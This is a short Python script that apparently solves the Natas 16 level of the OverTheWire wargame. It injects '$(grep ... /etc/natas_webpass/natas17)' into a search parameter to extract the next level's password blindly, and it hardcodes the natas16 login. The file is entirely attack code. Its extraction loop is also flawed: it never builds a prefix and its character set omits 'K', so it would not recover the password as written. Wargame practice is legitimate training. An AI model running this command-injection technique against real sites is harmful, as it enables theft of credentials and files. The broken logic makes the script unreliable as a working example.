import requests
from requests.auth import HTTPBasicAuth

natas_auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNOPQRSTUVWXYZ1234567890'
filtered = ''
passwd = ''

for char in cand:
	url = 'http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep ' + char + ' /etc/natas_webpass/natas17)&submit=Search'
	r = requests.get(url, auth=natas_auth)
	if 'Africans' not in r.text:
		filtered += char
		print(filtered)

for i in range(0,32):
	for char in filtered:
		url = 'http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep ' + char + ' /etc/natas_webpass/natas17)&submit=Search'
		r = requests.get(url, auth=natas_auth)
		if 'Africans' in r.text:
			passwd += char
			print(passwd)
			break